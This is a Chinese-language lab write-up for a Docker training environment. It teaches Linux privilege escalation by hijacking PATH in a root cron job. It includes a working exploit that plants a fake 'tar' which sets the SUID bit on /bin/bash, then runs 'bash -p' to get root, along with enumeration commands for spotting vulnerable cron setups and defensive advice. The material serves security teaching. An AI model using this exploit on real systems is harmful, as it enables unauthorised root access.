# Cron 计划任务提权（PATH 劫持）

## 原理

root 的 cron 脚本执行 `export PATH=/home/lowpriv/bin:$PATH` 后调用 `tar`
（不带绝对路径）。系统按 PATH 顺序查找 tar——**先找到 /home/lowpriv/bin/tar
（攻击者伪造的）而不是 /usr/bin/tar**，于是恶意 tar 以 root 身份执行。

## 环境

- 基础镜像：ubuntu:20.04
- 低权限用户：lowpriv / lowpriv123
- 漏洞配置：/home/lowpriv/bin 权限 777；root cron 脚本 export PATH 包含该目录并调用相对路径命令

## 复现步骤

利用文件已预置在容器内 /opt/exploits（属主 lowpriv，可读可写可执行），**全程在容器内操作**。

### 第一步：宿主机启动环境（仅这一步在宿主机）

```bash
cd ~/linux-privesc-lab/cron-path-hijack        # Kali 宿主机
docker compose up -d --build            # 构建并启动
docker exec -it cron-path-hijack su - lowpriv   # 进入容器 (密码 lowpriv123)
```

### 第二步：容器内确认漏洞环境

```bash
id                      # uid=1000(lowpriv) gid=1000(lowpriv)
sudo -l                 # 查看漏洞配置
ls -la /opt/exploits/   # 预置的漏洞利用文件 (源码/编译脚本/一键利用)
```

### 第三步：容器内利用（利用文件已预置在 /opt/exploits）

```bash
cd /opt/exploits

# 1. 在 PATH 最前端伪造 tar
cat > /home/lowpriv/bin/tar <<'EOF'
#!/bin/bash
chmod u+s /bin/bash
EOF
chmod +x /home/lowpriv/bin/tar

# 2. 等待 cron 执行 (最多 65 秒)
sleep 65

# 3. 验证提权
ls -l /bin/bash
# 预期: -rwsr-xr-x 1 root root ... /bin/bash
/bin/bash -p -c 'id'
# 预期: euid=0(root)   提权成功!
```

### 一键利用（容器内）

```bash
cd /opt/exploits && bash exploit.sh
```

## 手动利用（分步教学）

### 第一步：理解 PATH 解析机制

root 的 cron 脚本内容：
```bash
export PATH=/home/lowpriv/bin:$PATH
tar czf /tmp/pathbk.tar.gz /var/log
```

脚本把 `/home/lowpriv/bin`（lowpriv 可写的目录）放到了 PATH **最前面**，
然后调用 `tar`（不带绝对路径）。系统按 PATH 顺序找 tar：
**先找到 /home/lowpriv/bin/tar（攻击者伪造的）而不是 /usr/bin/tar**。

### 第二步：伪造同名命令

```bash
cat > /home/lowpriv/bin/tar <<'EOF'
#!/bin/bash
chmod u+s /bin/bash
EOF
chmod +x /home/lowpriv/bin/tar
```

### 第三步：等待 cron 执行

```bash
sleep 65
/bin/bash -p -c 'id'
# 预期: euid=0(root)
```

### 为什么这是常见真实场景

- cron 默认 PATH 是 `/usr/bin:/bin`（安全）
- 但脚本内部 `export PATH` 覆盖、或 crontab 头部写了 `PATH=/home/xxx:...` 就出问题
- 经典变体：脚本调用 `service` 但 service 在 /usr/sbin 不在 cron PATH，
  攻击者在 PATH 更前的可写目录伪造 service

### 发现技巧

```bash
cat /etc/crontab | grep PATH                    # 看 crontab 头部 PATH
grep -rn 'PATH=' /usr/local/bin/*.sh 2>/dev/null # 看脚本内 export PATH
```

### 防御

- 脚本内所有命令使用绝对路径（/usr/bin/tar）
- 不把用户可写目录加入 PATH

为什么能成功

- 脚本内 `export PATH=/home/lowpriv/bin:$PATH` 把用户目录放在 PATH 最前
- cron 以 root 运行脚本, 调用 `tar` 时命中伪造的 /home/lowpriv/bin/tar
- 恶意 tar 内容（chmod u+s /bin/bash）以 root 执行

## 防御

- 脚本内所有命令使用绝对路径（/usr/bin/tar）
- 不把用户可写目录加入 PATH
- cron 默认 PATH 是 /usr/bin:/bin, 警惕脚本内部 export PATH 的写法


## 扩展教学（网络搜索整理）

### 两种触发场景

**场景 A：脚本内 export PATH（本环境）**
```bash
#!/bin/bash
export PATH=/home/lowpriv/bin:$PATH
tar czf ...    # tar 不带绝对路径
```

**场景 B：crontab 头部 PATH（更隐蔽）**
```
# /etc/crontab
PATH=/home/deploy/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/bin
*/10 * * * *  root  report-sync
#                             ^^ 裸命令名, 通过 PATH 解析
# /home/deploy/bin 可写 -> 伪造 report-sync -> root 定时执行
```

### 枚举技巧

```bash
# 1. 看 crontab 头部 PATH
head -5 /etc/crontab

# 2. 找脚本内的 export PATH
grep -rn 'export PATH' /usr/local/bin/ /opt/ 2>/dev/null

# 3. 找裸命令名调用
grep -rhoE '^\s+[a-z_-]+$' /usr/local/bin/*.sh 2>/dev/null | sort -u
```

### 为什么 root 的 cron 也会踩坑

cron 执行任务时只设置最小环境（PATH=/usr/bin:/bin），但脚本内部
export PATH 会把风险重新引入；真实系统里 service/mysqldump 等
裸命令调用是常见坑。

### 防御

- 脚本内所有命令用绝对路径（/usr/bin/tar）
- crontab 头部 PATH 只含 root 属主目录
- 用户可写目录永远不放 PATH 前端

## 验证记录

2026-08-26 真实环境验证：注入后等待 65 秒，`/bin/bash -p -c 'id'` 输出
`uid=1000(lowpriv) ... euid=0(root)`。复现成功。
